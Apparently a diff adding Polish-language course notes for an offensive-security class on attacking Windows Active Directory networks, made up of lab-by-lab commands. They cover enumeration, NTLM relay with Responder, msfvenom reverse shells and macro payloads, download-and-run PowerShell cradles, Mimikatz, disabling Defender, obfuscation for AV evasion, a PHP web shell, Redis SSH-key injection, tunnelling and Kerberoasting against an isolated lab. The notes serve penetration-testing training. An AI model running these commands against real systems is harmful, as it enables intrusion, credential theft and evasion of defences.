@@ -1,0 +1,1595 @@
+📅 26.11.2022 🕘 [09:00]
+
+Wykładowca: Jakub Plusczok
+jakub.p@hackeru.com
+
+Global Advanced Infrastructure Attacks
+
+Chapter 1 Enumerating an Organization & Lateral Movement & Permission Misconfiguration
+= - = - = - = - = - = - =  - = - = - = - = - = - = - = - = - = - = - = - = - = - = - =
+
+ℹ️ Przerwy: 
+
+10.30-11.00
+12.30-13.00
+15.00-15.30
+
+---
+
+[Enumerating an Organization]
+
+Advanced Infrastructure.ova - 36.8 GB
+https://ln2.sync.com/dl/292f3fd40/9k4quxxv-hn3h8san-2uu7fkjq-2ugu5bad/view/default/9345169440007
+
+### 📋 – Lab01 Dsquery
+
+Windows Server 2016
+Windows 10
+
+Adresacja sieci NAT Network: 10.20.10.0/24
+
+Domain admins: jessicar
+Password: Aa123456!
+
+\\cyber.local
+
+    Wyświetlenie statusu o domenie
+
+    dsregcmd /status
+
+
+    Wylistowanie wszystkich informacji o domenie
+
+    ping cyber.local
+
+    dsquery * dc=cyber,dc=local
+
+
+Biblioteka dla dsquery
+C:\Windows\system32\dsquery.dll
+
+    Wylistowanie użytkowników
+
+    dsquery user
+
+    dsquery user -name J*
+
+
+    Wylistowanie komputerów
+
+    dsquery computer
+
+    dsquery computer -name WIN*
+
+    dsquery computer "ou=domain controllers,dc=cyber,dc=local"
+
+
+***
+
+### 📋 – Lab02 BloodHound
+
+Kali: Ustawienie statycznego interface'u sieciowego
+
+sudo nano /etc/network/interfaces
+
+    auto eth0
+
+    iface eth0 inet static
+
+    address 10.20.10.111/24
+
+    gateway 10.20.10.1
+
+
+Restart interface'u
+
+    sudo ifconfig eth0 down
+
+    sudo ifconfig eth0 up
+
+    ip a
+
+
+Ustawienie wersji java
+
+    ﻿update-alternatives --config java
+
+    Selection: 0
+
+
+BloodHound - GitRepository
+
+    mkdir tools
+
+    git clone https://github.com/BloodHoundAD/BloodHound.git
+
+
+neo4j (preinstalowany na Kali)
+
+    sudo neo4j console
+
+
+bloodhound (preinstalowany na Kali)
+
+    bloodhound
+
+🔑 – neo4j:Aa123456!
+
+Uruchomienie serwera www
+sudo python3 -m http.server 80
+
+Przed pobranem pliku SharpHund.ps1 należy wyłączyć antywirusa wbudowanego w system Windows:
+IEX (New-Object net.webclient).downloadstring('http://10.20.10.111/SharpHound.ps1')
+lub
+IEX (New-Object net.webclient).downloadstring('http://10.20.10.111:80/SharpHound.ps1')
+
+Uruchomienie BloodHound:
+Invoke-BloodHound -CollectionMethod default
+
+Naprawa upload server:
+sudo apt update
+sudo apt install python3-pip
+python3 -m pip install uploadserver
+sudo python3 -m uploadserver 80
+
+http://10.20.10.111/upload
+
+
+### 📋 – Lab03 PingCastle
+
+Należy pobrać PingCastle na Kalim i przenieść na Windows:
+sudo python3 -m http.server 80
+pobrać i uruchomić program PingCastle na serwerze Windows 2016
+1 enter
+wygenerują się 2 nowe pliki, należy uruchomic plik ad_hc_cyber.local.html
+
+### 📋 – Lab4 PowerView
+
+Należy pobrać powerview na kalim (skopiować i zapisać w pliku pv.ps1) :
+
+https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
+
+odpalić udostępnianie i pobrać na Windows serwer 2016:
+sudo python3 -m http.server 80
+
+lub II metoda:
+IEX (New-Object net.webClient).downloadstring("http://10.20.10.111/pv.ps1")
+
+Get-NetDomainController 
+Get-NetLoggedon 
+Get-NetOU 
+Get-NetSession 
+Get-NetDomain  
+Get-NetUser 
+net user jessicar /domain
+
+
+### 📋 – Lab5 PsExec
+
+Dodajemy nowy wpis do rejestru na obu maszynach windows 10:
+Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+tworzymy DWORD (LocalAccountTokenFilterPolicy= 0)
+
+pobrać psexec na kalim:
+https://learn.microsoft.com/en-us/sysinternals/downloads/psexec
+i udostępnić: 
+sudo python3 -m http.server 80
+
+Po pobraniu psexeca na stacji Windows10 wprowadzamy w cmd (uruchomiony w jako administrator):
+PsExec -s cmd /accepteula
+whoami
+
+psexec.exe \\DESKTOP-2 -u Administrator -p "Aa123456!" -s cmd
+
+
+### 📋 – Lab6 WMIC
+
+Na maszynie Windows 10 wprowadzamy w cmd (uruchomiony w jako administrator):
+wmic /node:10.20.10.200 /user:georgej /password:Aa123456! process call create calc.exe 
+wmic /node:10.20.10.200 /user:georgej /password:Aa123456! process call create notepad.exe 
+
+wmic /node:10.20.10.200 /user:georgej /password:Aa123456! process where name="win32calc.exe" call terminate 
+
+
+### 📋 – Lab7 WinRM
+Na obu maszynach Windows 10 wprowadzamy w cmd (uruchomiony w jako administrator):
+powershell
+enable-PSRemoting -force
+Set-Item WSMAN:\localhost\Client\TrustedHosta *
+Y
+$kredki = Get-Crefentioal
+Cyber\jessicar
+Aa123456!
+
+enter-PSSession -ComputerName Desktop-2 -Credential $kredki
+whami
+
+cd c:\users\georgej\Desktop
+ls 
+
+net user dadada Gagagas!23 /add
+net user
+net localgroup administrators dadada /add
+
+
+### 📋 – Lab8 Evil-WinRM
+
+Na maszynie z Kalim:
+git clone https://github.com/PowerShellMafia/PowerSploit
+gem install evil-winrm
+evil-winrm -i 10.20.10.200 -u jessicar -p Aa123456! -s ~/tools/PowerSploit/Privesc/
+whoami
+ipconfig
+#wylączenie AV
+Bypass-4MSI
+PowerUp.ps1
+Invoke-Privscaudit
+
+***
+
+📅 27.11.2022 🕘 [09:00]
+
+Chapter 2 SMB Relay & Responder & PowerShell as a Weapon 
+= - = - = - = - = - = - = - = - = - = - = - = - = - = -
+
+[SMB Relay and Responder]
+
+🔗 -- ciekawe linki:
+https://twitter.com/0gtweet?ref_src=twsrc%5Egoogle%7Ctwcamp%5Eserp%7Ctwgr%5Eauthor
+https://github.com/gtworek
+https://twitter.com/pawelmaziarz
+https://aptmasterclass.com/forge/ -> u góry "protipy"
+https://github.com/AidenPearce369/OSCP-Notes
+https://oscpnotes.infosecsanyam.in/My_OSCP_Preparation_Notes.html
+https://github.com/wwong99/pentest-notes/blob/master/oscp_resources/OSCP-Survival-Guide.md
+https://github.com/ex16x41/OSCP-1
+
+### 📋 – Lab1 Capturing LLMNR
+
+Uruchomić 3 maszyny: Windows server 2016, Windows 10 i Kali.
+Na kali uruchomić wireshark.
+na windows (windows+R) i wpisać cokolwiek \\cokolwiek, i dodtaniemy błąd i proszę sprawdzić co jest zarejestrowane w Kalim - wireshark.
+
+arp -a
+
+Na windows 10 uruchomić w notatniku (uruchomiony jako administrator) plik:
+c:\Windows\System32\drivers\etc  -  plik hosts
+dodajemy wpis:
+10.20.10.5      onet.pl 
+zapisać plik
+
+
+### 📋 – Lab2 NTLMv2 Cracking
+
+#na kalim:
+sudo apt update
+sudo apt install responder
+sudo apt install john
+
+🔗 -- ciekawy opis:
+https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4
+https://en.hackndo.com/ntlm-relay/
+
+#lista haseł:
+wordlists
+/usr/share/wordlist
+#jesli jest rockyou spakowany to polecenie:
+sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
+wc -l /usr/share/wordlists/rockyou.txt
+grep 'Aa123456!' /usr/share/wordlists/rockyou.txt
+echo 'Aa123456!' | sudo tee -a /usr/share/wordlists/rockyou.txt
+grep 'Aa123456!' /usr/share/wordlists/rockyou.txt
+wc -l /usr/share/wordlists/rockyou.txt
+
+cd /etc/responder/
+ls
+
+sudo nano responder.conf
+#zmieniamy:
+SMB = On
+HTTP = On
+Serve-Exe = Off
+Serve-Html = Off
+
+sudo su
+responder -I eth0 -v
+
+#Na Windows 10 wpisać nieistniejący zasób:
+\\cokolwiek 
+powinien złąpać się hash na Kalim (w responderze)
+
+#na klaim w katalogu domowym utworzyć plik i zapisać złapany hash:
+nano hash.txt
+hashid hash.txt
+john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+
+### 📋 – Lab3 SMB Relay Attack
+
+Uruchomić 2 Windowsy 10 i Kali
+#w Kalim:
+crackmapexec smb 10.20.10.0/24 --gen-relay-list targets.txt
+cat targets.txt
+sudo nano /etc/responder/Responder.conf
+#zmieniamy:
+SMB = Off
+HTTP = Off
+
+    Uruchamiamy Responder
+
+    sudo responder -I eth0 -v
+
+
+    Uruchamiamy ntlmrelayx
+
+    # wywołanie komendy ipconfig
+
+    impacket-ntlmrelayx -tf /root/targets.txt -smb2support -c "ipconfig"
+
+    # tryb interaktywny -i
+
+    impacket-ntlmrelayx -tf /root/targets.txt -smb2support -i
+
+    # lub ze skryptu python'a
+
+    cd /usr/share/doc/python3-impacket/examples
+
+    sudo python3 ntlmrelayx.py -tf /root/targets.txt -smb2support -c "whoami"
+
+
+    Na Windows wywołanie nieistniejącego Share
+
+    \\nieistniejacyzasob
+
+
+    Używamy netcat’a, aby dostać się do powłoki
+
+    nc 127.0.0.1 11000
+
+    # who
+
+    jessicar
+
+    # use c$
+
+
+    Basic Authentication
+
+sudo nano /etc/responder/Responder.conf
+
+# do zmiany:
+
+    SMB = On
+
+    HTTP = On
+
+
+    Uruchamiamy Responder
+
+sudo responder -I eth0 -v -b
+
+ℹ️ Info
+Otrzymujemy okno do logowania, które nie jest szyfrowane (tylko base64)
+W przypadku wpisania poświadczeń przez użytkownika otrzymujemy je w plaint text w responder.
+
+***
+
+🔗 -- Więcej materiałów w rozszerzeniu tematu WPAD
+https://adamziaja.com/
+
+***
+
+📋 – Lab04 Responder Advanced Attack
+
+Kali
+
+    Zmiana konfiguracji Responder.conf
+
+sudo nano /etc/responder/Responder.conf
+
+# do zmiany:
+
+    SMB = On
+
+    HTTP = On
+
+
+    [HTTP Server]
+
+    Serve-Exe = On
+
+    Serve-Html = On
+
+
+    ExeFilename = files/payload.exe
+
+
+    Wygenerowanie payload'u
+
+    msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.20.10.111 LPORT=4444 -f exe > /usr/share/responder/files/payload.exe
+
+
+    metasploit
+
+    msfconsole
+
+    use exploit/multi/handler
+
+    set LPORT 4444
+
+    set LHOST 10.20.10.111
+
+    run
+
+
+    lub oneliner
+
+
+    sudo msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell_reverse_tcp; set LHOST 10.20.10.111; set LPORT 4444; run; exit -y;"
+
+
+    Responder
+
+    sudo responder -I eth0 -v
+
+
+    Windows
+
+    sprawdzenie wyłączenia AV
+
+    w przeglądarce odwołujemy się do nieistnejącej strony np. http://aassddff
+
+    klikamy link do Proxy Client
+
+    dostajemy sesję w msfconsole
+
+
+***
+
+[PowerShell as a Weapon]
+
+Uruchomienie Powershell ISE
+Win+R
+C:\Windows\system32\WindowsPowerShell\v1.0\powershell_ise.exe
+
+    wersja Powershell
+
+    $PSVersionTable
+
+
+Get-Command | Select-String "get-"
+Get-Help Invoke-Expression
+Get-Alias
+
+***
+
+### 📋 – Lab05 PowerShell Basics
+
+    Wyświetlenie informacji w terminalu:
+
+    Write-Host "Hello HackerU" -ForegroundColor DarkRed -BackgroundColor Green
+
+    Odczytanie aliasu do dir
+
+    Get-Alias dir
+
+
+    Wyświetlenie atrybutów BIOS
+
+    Get-CimClass | select-string bios
+
+    Get-CimInstance -ClassName Win32_BIOS
+
+    Get-WmiObject -ClassName win32_BIOS
+
+
+    Wyłączenie Defender i Firewall
+
+
+🔗 – Disable Windows Defender in powershell
+https://bidouillesecurity.com/disable-windows-defender-in-powershell/
+
+
+    odczytanie statusu Defender'a
+
+    Get-MpPreference
+
+
+    wyłącznie Defender
+
+    Set-MpPreference -DisableRealtimeMonitoring $true
+
+
+    wyłącznie Firewall
+
+    netsh advfirewall set allprofiles state off
+
+
+***
+
+### 📋 – Lab06 Importing PowerShell Module
+
+Windows 10 (NAT Network)
+
+🔗 – Mimikatz - wersja powershell (.ps1)
+https://github.com/samratashok/nishang/blob/master/Gather/Invoke-Mimikatz.ps1
+
+    Powershell
+
+
+    Set-ExecutionPolicy Bypass
+
+
+    Pobranie skryptu i załadowanie do pamięci
+
+    Invoke-WebRequest -uri "https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1"  | IEX
+
+
+    uruchomienie
+
+    Invoke-Mimikatz
+
+
+***
+
+### 📋 – Lab07 Reverse Shell
+
+Kali:
+
+    mkdir pc && $_
+
+    Instalacja uploadserver
+
+    sudo apt update
+
+    sudo apt install python3-pip
+
+    sudo python3 -m pip install uploadserver
+
+    Terminal 1: python3 -m uploadserver 80
+
+    Terminal 2: nc -lnvp 4000
+
+    odbieramy sesję z Windows 10
+
+
+Windows:
+
+    Przeglądarka http://10.20.10.111/upload
+
+    powershell -ep bypass
+
+    (New-Object net.webclient).downloadstring("http://10.20.10.111/pc111.ps1") | IEX
+
+
+***
+
+### 📋 – Lab08 Nishang & PowerCat
+
+❗Zmiany należy wykonać w kontekście Administratora lokalnego
+
+Wyłączenie Real Time Protection
+
+    Open Local Group Policy Editor (gpedit.msc)
+
+    Computer Configuration > Administrative Templates > Windows Components > Windows Defender Antivirus > Real-time Protection
+
+    Enable `Turn off real-time protection`
+
+    Reboot
+
+
+Wyłączenie Microsoft Defender:
+
+    Open Local Group Policy Editor (type gpedit in the search box)
+
+    Computer Configuration > Administrative Templates > Windows Components > Windows Defender Antivirus
+
+    Enable `Turn off Microsoft Defender Antivirus`
+
+    Reboot
+
+
+🔗 – Powercat
+https://github.com/besimorhino/powercat
+
+Opcja I
+
+Windows 10 - Powershell
+
+    iwr -uri https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1 -OutFile pc.ps1
+
+    powershell -ep bypass
+
+    ..\pc.ps1
+
+    powercat -h
+
+    powercat -c 10.20.10.111 -p 4000 -e cmd -v
+
+
+Kali:
+
+    sudo su
+
+    ip a
+
+    nc -lnvp 4000
+
+    odbieramy sesję z Win10
+
+
+Opcja II
+
+Windows 10
+
+    Zmiana nazwy skryptu na pc111.ps1
+
+    Edycja w Powershell ISE
+
+    dodajemy na końcu skryptu
+
+    powercat -c 10.20.10.111 -p 4000 -e cmd -v
+
+    nowy terminal Powershell
+
+    Win+R powershell -ep bypass
+
+    Get-ExecutionPolicy
+
+    ..\pc111
+
+
+Kali:
+
+    sudo su
+
+    nc -lnvp 4000
+
+
+🔗 – Nishang - Invoke-PowerShellTcp
+https://github.com/samratashok/nishang
+
+https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
+
+Powershell
+
+    Set-ExecutionPolicy Bypass
+
+    (New-Object net.webclient).downloadstring("https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1") | IEX
+
+    Invoke-PowerShellTcp -Reverse -IPAddress 10.20.10.111 -port 4000
+
+
+Kali:
+
+    sudo su
+
+    nc -lnvp 4000
+
+
+***
+
+📅 03.12.2022 🕘 [09:00]
+
+Wykładowca: Jakub Plusczok
+
+Global Advanced Infrastructure Attacks
+
+Chapter 3 Obfuscation Techniques & Office Exploitation 
+= - = - = - = - = - = - =  - = - = - = - = - = - = - =
+
+🔗 –  commando-vm
+https://github.com/mandiant/commando-vm
+
+
+[Obfuscation Techniques]
+
+### 📋 – Lab01 Invoke-Obfuscation
+
+    utworzyć nowy katalog i dodać go do wyjątków w `Virus & Thread Protection`
+
+    c Download Invoke-Obfuscation https://github.com/danielbohannon/Invoke-Obfuscation
+
+    🔗 – ZIP https://github.com/danielbohannon/Invoke-Obfuscation/archive/refs/heads/master.zip
+
+    script.rar https://ln.sync.com/dl/81c312cb0/wcw56n7t-ykm2mmeu-z69npzsm-7umynj7y/view/default/10055233490007 🔑 password
+
+    powershell -ep bypass
+
+    cd C:\Users\jessicar\Desktop\malware\Invoke-Obfuscation-master\Invoke-Obfuscation-master
+
+    Import-Module .\Invoke-Obfuscation.psd1
+
+    Invoke-Obfuscation
+
+    SET SCRIPTPATH c:\Users\jessicar\Desktop\malware\pc111.ps1
+
+    TOKEN\ALL\1
+
+    zapis do pliku OUT
+
+    wykonanie Reverse Shell za pomocą obfuscowanego skryptu
+
+    Kali: sudo nc -lvnp 4000
+
+
+***
+
+Link do CyberChef'a:
+https://gchq.github.io/CyberChef/
+
+Podstawy narzędzia CyberChef:
+https://www.youtube.com/watch?v=PsJp0BNh5A0
+
+Link do VirusTotal:
+https://www.virustotal.com/gui/home/upload
+
+Reset licencji dla Windows Server
+jako administrator w cmd: slmgr -rearm
+
+***
+
+### 📋 – Lab02 Chimera Obfuscation
+
+apt install -Vy sed xxd libc-bin curl jq perl gawk grep coreutils git
+
+Sklonowanie chimery z gita do folderu /opt/chimera:
+git clone https://github.com/tokyoneon/chimera /opt/chimera
+
+Użycie chimery:
+./chimera.sh -f /home/krang/tools/pc/pc111.ps1 -l 5 -o /home/krang/tools/pc/chimera.ps1 -v -t powershell,windows,copyright -c -i -h -s length,get-location,ascii,stop,close,getstream -b new-object,reverse,invoke-expression,out-string,write-error -j -g -k -r -p
+
+***
+
+### 📋 – Lab04 Macro Payload
+
+Fajny artykuł jako uzupełnienie tematu Makr:
+https://www.cynet.com/attack-techniques-hands-on/office-macro-attacks/
+https://levelup.gitconnected.com/ethical-hacking-part-13-office-macro-attacks-3a8a0cad14b7
+
+Komenda msfvenom użyta przy tworzeniu makra:
+msfvenom -p windows/meterpreter/reverse_tcp lhost=10.20.10.111 lport=4000 -f vba-exe > macro.txt
+
+Handler użyty do przchwycenia połączenia z makra:
+sudo msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 10.20.10.111; set LPORT 4000; run; exit -y;"
+
+***
+
+### 📋 – Lab05 PowerPoint Hyperlink
+
+https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
+
+
+***
+
+📅 04.12.2022 🕘 [09:00]
+
+Wykładowca: Jakub Plusczok
+
+Global Advanced Infrastructure Attacks
+
+Chapter 4 Exploiting Services within an Organization & Reverse Shells and Tunneling
+= - = - = - = - = - = - =  - = - = - = - = - = - = - = - = - = - = - = - = - = - = 
+
+W przypadku problemów z licencją na systemie operacyjnym Windows należy wykonać polecenie w cmd:
+slmgr -rearm
+
+[Reverse Shells and Tunneling]
+
+### 📋 – Lab07 Reverse Shell
+
+#generujemy payload
+msfvenom -p windows/meterpreter/bind_tcp rhost=ip_windowsa lport=6000 exe > bshell.exe 
+
+python3 -m http.server 80
+
+Windows 10 w lini poleceń
+powershell -ep bypass
+iwr -uri "http://10.20.10.111/bshell.exe" -OutFile bshell.exe
+get-alias iwr
+
+Kali
+
+msfconsole -q
+use multi/handler
+set payload windows/meterpreter/bind_tcp
+show options
+set lport 6000
+set rhost ip_windowsa
+exploit
+shell
+whoami
+hostname
+
+Windows 10 w lini poleceń
+./bshell.exe
+
+***
+
+🔗 – Reverse Shell Cheat Sheet
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
+
+
+### 📋 – Lab08 SSH Tunneling
+
+🔗 – doinstalować OpenSSH server
+https://newsblog.pl/jak-zainstalowac-openssh-w-systemie-windows-10/
+
+🔗 – więcej infomacji o ssh-tunnels
+https://falconspy.medium.com/oscp-understanding-ssh-tunnels-519e31c698bf
+https://www.tunnelsup.com/how-to-create-ssh-tunnels/
+
+Windows 10
+
+Powershell -ep bypass
+. .\pc.ps1
+powercat -l -p 6000
+
+Kali
+
+nc 10.20.10.44 6000 -v
+
+#i jest chat mozna przetestowac
+
+#nalezy stworzyć regułę w firewall aby zablokować port 6000 i sprawdzic czy połączenie jest blokowane:
+nc 10.20.10.44 6000 -vn
+
+#uruchomić Powershell jako administrator:
+start-service sshd
+
+Kali
+
+ssh jessicar@10.20.10.44
+whoami
+hostname
+ssh -N -T -L 5555:10.20.10.44:6000 jessicar@10.20.10.44
+nc -v 127.0.0.1 5555
+elo
+
+Windows 10
+
+powercat -l -p 6000
+elo
+
+###############################
+
+Kali
+
+service ssh start
+netstat -tulpn
+nano /etc/ssh/sshd_config
+PermitRootLogin yes
+
+Windows 10
+
+powercat -l -p 6000
+ssh krang@10.20.10.111
+ssh -R 5555: 10.20.10.44:6000 krang@10.20.10.111
+
+### 📋 – Lab09 DNS Tunneling
+
+Kali
+git clone https://github.com/iagox86/dnscat2
+cd dnscat2/server/
+gem install bundler
+bundle install
+ls
+ruby dnscat2.rb
+
+Windows 10
+
+iwr -Uri "https://downloads.skullsecurity.org/dnscat2/dnscat2-v0.07-client-win32.zip" -OutFile dnscat2.zip
+ls
+#rozpakowac, haslo password
+cd dnscat2
+#podmienić secret na swój
+.\dnscat2-v0.07-client-win32.exe --dns server=10.20.10.111,port=53 --secret=a0152c228f44a90ef494ff92a14b3653
+
+Kali
+sessions
+session -i 1
+help
+shell
+ctrl+z
+sessions
+session -i 2
+whoami
+hostname
+ipconfig
+
+***
+
+### 💡 – Extra Lab
+
+Zestawienie połączenia tunelowego z Kali do Windows Server przez Windows 10
+
+
+Windows Server: 10.20.10.5
+    Windows 10: 10.20.10.44
+          Kali: 10.20.10.111
+
+Windows Server
+
+    Server Manager > Local Server > Remote Desktop > Enabled (Allow remote connections to the computer)
+
+    Firewall - modyfikujemy regułę dla RDP
+
+    Inbound Rules > Remote Desktop - User Mode (TCP-In)
+
+    Zakładka Scope > Specify the IP address to match > 10.20.10.44
+
+
+Kali
+
+Sprawdzenie komunikacji
+
+    nc -vn 10.20.10.5 3389
+
+
+Nawiązanie sesji RDP
+
+    rdesktop -u jessicar -d cyber 10.20.10.5
+
+
+Uruchominie usługi ssh
+
+    sudo systemctl ssh start
+
+
+Nawiązanie RDP połączenia z Kali
+
+    rdesktop -u jessicar -d cyber 127.0.0.1:5555
+
+    yes
+
+
+Windows 10
+
+Uruchamiamy Remote Desktop Connection i logujemy się jako jessicar
+
+    Wykonanie tunelu do portu 3389 do 10.20.10.5
+
+    Powershell
+
+    ssh -R 5555:10.20.10.5:3389 krang@10.20.10.111
+
+
+***
+
+[Exploiting Services within an Organization]
+
+🔗 -- CheeseBox2021-2.ova - 957.4 MB
+https://ln5.sync.com/dl/7b81ac720/darxy2jh-6d3wcrjx-z8b5mrdy-km2m6g6m/view/default/10592066840007
+
+Przygotowanie środowiska Kali
+
+    sudo apt update
+
+    sudo apt install redis-tools
+
+    pip3 install paramiko
+
+
+Modyfikacja ustawień sieciowych
+
+    Adapter 1: Internal Network
+
+    Wyłączenie eth1:
+
+    sudo ifconfig eth1 down
+
+
+Zmiany w konfiguracji
+
+    sudo nano /etc/network/interfaces
+
+    auto eth0
+
+    iface eth0 inet dhcp
+
+    sudo /etc/init.d/networking restart
+
+
+***
+
+🔗 -- PoC-in-GitHub
+https://github.com/nomi-sec/PoC-in-GitHub
+
+
+### 📋 – Lab01 Nmap Enumeration
+
+    Kali 172.15.0.28
+
+CheeseBox 172.15.0.11
+
+    Ping Scan - skan podsieci
+
+    nmap -sn 172.15.0.0/24
+
+
+    Skan wszystkich portów z uzuskaniem wersji istniejących serwisów na 172.15.0.11 -T<1-5> prędkość oraz zapis do pliku -oA
+
+    nmap -v -sV -p- -T4 172.15.0.11 -oA 11_alltcp
+
+
+***
+
+### 📋 – Lab02 SearchSploit
+
+    Searchspoit Update
+
+    searchsploit -u
+
+
+    Wyszukanie exploitów do znalezionych serwisów na maszynie
+
+    searchsploit OpenSSH
+
+
+***
+
+### 📋 – Lab03 AXFR
+
+dig cheesus.com @172.15.0.11 AXFR
+
+***
+
+### 📋 – Lab04 FTP Anonymous
+
+    Połączenie ftp
+
+    ftp 172.15.0.11
+
+    anonymous
+
+    <no password>
+
+
+    Download & Upload pliku
+
+    lcd /home/krang
+
+    get index.html
+
+    put ala
+
+
+    Web shell
+
+    cd /usr/share/webshells
+
+    cp php-reverse-shell.php /home/krang
+
+    nano php-reverse-shell.php
+
+    $ip = '172.15.0.28';
+
+    $port = 5555;
+
+    put php-reverse-shell.php
+
+
+    Terminal 1: nc -lnvp 5555
+
+    Firefox: http://172.15.0.11/php-reverse-shell.php
+
+
+    ***
+
+
+    💡 Enumeracja użytkowników
+
+
+    searchsploit -m 45939
+
+    OpenSSH < 7.7 - User Enumeration
+
+    nano 45939.py
+
+    zmiany
+
+    linia 2 python2 > python 3
+
+    wszystkie print " > print(...)
+
+
+    python3 45939.py 172.15.0.11 root
+
+
+    for user in `cat users`; do python3 45939.py 172.15.0.11 $user; done
+
+    [+] cheesus is a valid username
+
+
+***
+
+### 📋 – Lab05 Redis SSH Key
+
+    Połączenie z bazą danych redis
+
+    redis-cli -h 172.15.0.11
+
+    ping
+
+    get secret
+
+    set secret hahahaha
+
+    get secret
+
+    save
+
+    exit
+
+
+    Generowanie klucza ssh
+
+    ssh-keygen -t rsa -b 2048
+
+    Enter file in which to save the key: redis
+
+
+    Dodajemy 2 `Entery` na początku i końcu pliku redis.pub 
+
+
+    Utworzenie zmiennej dla redis
+
+    cat redis.pub | redis-cli -h 172.15.0.11 -x set mojklucz
+
+
+    Umieszczenie klucza w pliku na CheeseBox
+
+    redis-cli -h 172.15.0.11
+
+    config set dir /home/cheesus/.ssh/
+
+    config set dbfilename "authorized_keys"
+
+    save
+
+    exit
+
+
+    Połączenie z ssh za pomocą klucza
+
+    ssh -i /home/krang/redis cheesus@172.15.0.11
+
+
+🔗 – 6379 - Pentesting Redis
+https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis
+
+***
+
+📅 10.12.2022 🕘 [09:00]
+
+Wykładowca: Jakub Plusczok
+
+Global Advanced Infrastructure Attacks
+
+Chapter 5 Kerberosting & Ticket Attacks 
+= - = - = - = - = - = - =  - = - = - = 
+
+Rodzaje protokołów - uwierzytelnienia:
+    
+    \\10.20.100.11\udzial > netNTLMv2 (challange-response)
+    \\serwer001\udzial > kerberos
+
+🔗 -- Daniel Stefaniak - Tajniki działania protokołu Kerberos
+https://www.youtube.com/watch?v=CNCMHd82Ul0
+
+***
+
+### 📋 – Lab01 Understanding Kerberos
+
+Środowisko: Advanced Infrastructure.ova
+Windows Server DC & Windows 10
+Password: Aa123456!
+
+Kali
+Adapter 1: NAT Network
+Adapter 2: Bridge
+
+Sprawdzenie komunikacji z domeną:
+
+    Win+R
+
+    \\cyber.local
+
+
+w przypadku pojawienia się błędu:
+
+    klist purge
+
+    przełączyć użytkownika (sign out) lub shutdown -l
+
+    jeżeli dalej nie działa
+
+    Win+R ncpa.cpl
+
+    wyłączyć i włączyć kartę sieciową - Disable > Enable
+
+    ping cyber.local
+
+
+Kali: Ustawienie statycznego interface'u sieciowego
+
+sudo nano /etc/network/interfaces
+
+    auto eth0
+
+    iface eth0 inet static
+
+    address 10.20.10.111/24
+
+    gateway 10.20.10.1
+
+
+Restart interface'u
+
+    sudo ifconfig eth0 down
+
+    sudo ifconfig eth0 up
+
+    ip a
+
+
+---
+Kali:
+    
+cd /home/krang/tools
+mkdir kerberos && cd $_
+python3 -m uploadserver 80
+
+Windows 10:
+
+    uruchamiamy Wireshark
+
+    wybieramy interface: Ethernet
+
+    filtr: kerberos
+
+
+Wymuszamy ruch do serwera:
+    
+
+    user: cyber\georgej Aa123456!
+
+    uruchamiamy nowy proces jako georgej
+
+    cmd as jessicar
+
+    runas /user:cyber\georgej cmd
+
+    password
+
+    otrzymujemy nowy terminal jako georgej
+
+
+W Wireshark przechwyciliśmy pakiety związane z protokołem kerberos.
+
+Termnial georgej
+
+    wyświetlenie istniejących ticketów 
+
+    klist
+
+    klist purge #wyczyszczenie listy ticket'ów
+
+
+
+Wyekstrahowanie i łamanie hash'y z pliku z zapisem ruchu sieciowego
+Kali:
+    
+
+    Zapisujemy przechwycony ruch sieciowy z Wireshark do .pcapng i przenosimy do Kali
+
+    Zmiana formatu na .pdml
+
+    tshark -r georgej_tgt_tgs.pcapng -T pdml > georgej_tgt_tgs.pdml
+
+
+    Wyekstrahowanie hash'y
+
+    locate krb2john.py
+
+    cp /usr/share/john/krb2john.py .
+
+    python3 krb2john.py georgej_tgt_tgs.pdml > georgej_tgt_tgs.txt
+
+    cat georgej_tgt_tgs.txt
+
+
+    Łamanie hash'y z wykorzystaniem john'a
+
+    🔗 -- kerberos_WordList.txt https://ln5.sync.com/dl/54b666630/n6acbhxv-i9qimsu8-iznvqcmu-qrvefdsg/view/text/10748051020007
+
+    dodajemy hasła na końcu listy: Aa123456! P@ssw0rd p@ssw0rd aA123456!
+
+    sprawdzenie ilości haseł w pliku: wc -l wrd
+
+    john georgej_tgt_tgs.txt --wordlist=wrd
+
+
+     hashcat
+
+    hashcat -m 13100 -a 0 georgej_tgt_tgs.txt wrd
+
+
+🔗 -- Wszystkie moduły do hashcat 
+https://hashcat.net/wiki/doku.php?id=example_hashes
+
+***
+
+### 📋 – Lab02 Kerberoasting
+
+Windows Server DC & Kali
+
+Windows Server DC
+
+    cmd as Administrator
+
+    nowy user: net user kasia P@ssw0rd /add /domain
+
+    dodajemy user kasia do Administratorów lokalnych: net localgroup administrators kasia /add
+
+    Ustawienie SPN (Service Principal Name)
+
+    setspn -s http://cyber.local:80 kasia
+
+    Weryfikacja zmian
+
+    setspn -Q */*
+
+
+I opcja przy pomocy Invoke-Kerberoast
+
+    Wyłączamy Windows Defender
+
+    Powershell & załadowanie Invoke-Kerberoast.ps1 do pamięci RAM
+
+    Set-ExecutionPolicy Bypass
+
+    iex(new-object net.webclient).downloadstring("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
+
+    Invoke-Kerberoast
+
+    Invoke-Kerberoast -OutputFormat John | %{$_.Hash} | out-file -Encoding ascii C:\Users\jessicar\Desktop\kasia2.txt
+
+    Transfer pliku do maszyny Kali
+
+    sudo python3 -m uploadserver 80
+
+    http://10.20.10.111/upload)
+
+    Zmiany w pliku kasia2.txt
+
